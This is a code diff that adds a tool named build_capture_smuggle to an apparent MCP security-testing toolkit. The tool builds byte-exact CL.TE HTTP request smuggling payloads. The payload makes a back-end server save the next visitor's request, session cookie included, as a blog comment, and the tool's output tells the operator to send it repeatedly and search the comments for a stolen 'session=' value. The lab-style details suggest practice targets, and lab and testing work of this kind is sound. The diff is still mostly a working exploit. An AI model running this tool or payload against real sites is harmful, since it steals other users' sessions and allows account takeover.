@@ -11,9 +11,92 @@ from praetor.tools.testing_extended._helpers import (
     resolve_host_from,
     scope_or_error,
 )
+from praetor.tools.testing_extended._smuggle_capture import (
+    capture_cl_through,
+    wrap_clte,
+)
 
 
 def register(mcp: FastMCP):
+
+    @mcp.tool()
+    async def build_capture_smuggle(
+        host: str,
+        session_cookie: str,
+        csrf: str,
+        post_id: str = "1",
+        smuggled_content_length: int = 500,
+        sample_victim_request: str = "",
+        capture_through: str = "cookie",
+    ) -> dict:
+        """Build a byte-exact CL.TE capture-request smuggle for the "capture
+        other users' requests" class — no more hand-sizing Content-Length.
+
+        Produces the raw request to feed send_raw_request(http_version="direct",
+        count=N): an outer POST / (front-end honours Content-Length) whose
+        chunked body smuggles a POST /post/comment with the `comment` param LAST
+        and an oversized Content-Length, so the next user's request is stored as
+        the comment. The outer Content-Length is computed for you.
+
+        Sizing the smuggled Content-Length is the hard part: too small truncates
+        the capture before the victim's Cookie; too large and the back-end waits
+        for bytes the victim never sends (timeout). Pass a `sample_victim_request`
+        (even a truncated earlier capture) and it is sized to reach the end of the
+        `capture_through` header line via capture_cl_through(); otherwise
+        `smuggled_content_length` is used verbatim. The victim self-completes the
+        comment only when the value does not exceed its total request length, so
+        when the cookie is the last header the ideal value ~= that total —
+        byte-count from the deepest capture, don't binary-search.
+
+        Args:
+            host: Target host (also the smuggled Host).
+            session_cookie: YOUR session cookie value (authorises the smuggled comment POST).
+            csrf: YOUR csrf token from the post page.
+            post_id: Blog post id to comment on (default "1").
+            smuggled_content_length: Inner Content-Length when no sample is given (default 500).
+            sample_victim_request: A captured (even truncated) victim request to size the CL from.
+            capture_through: Header line to capture in full (default "cookie").
+        """
+        body = (
+            f"csrf={csrf}&postId={post_id}&name=Carlos+Montoya"
+            f"&email=carlos%40normal-user.net&website=&comment="
+        )
+        prefix_len = len(body.encode())
+
+        sizing = None
+        cl = smuggled_content_length
+        if sample_victim_request:
+            sizing = capture_cl_through(sample_victim_request, prefix_len, capture_through)
+            cl = sizing["content_length"]
+
+        smuggled = (
+            "POST /post/comment HTTP/1.1\r\n"
+            "Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {cl}\r\n"
+            f"Cookie: session={session_cookie}\r\n"
+            "\r\n"
+            f"{body}"
+        )
+        raw = wrap_clte(host, smuggled)
+
+        out = {
+            "raw": raw,
+            "smuggled_content_length": cl,
+            "prefix_len": prefix_len,
+            "next": (
+                "send_raw_request(raw=..., host=..., http_version='direct', count=20) "
+                "then GET the post and grep for a foreign 'session=' in a comment"
+            ),
+        }
+        if sizing is not None:
+            out["capture_depth"] = sizing["capture_depth"]
+            out["sample_found_target"] = sizing["found"]
+            if not sizing["found"]:
+                out["note"] = (
+                    f"'{capture_through}' not in sample — content_length is a floor; "
+                    "capture a deeper sample and re-run to reach it"
+                )
+        return out
 
     @mcp.tool()
     async def test_request_smuggling(session: str, path: str = "/") -> dict:
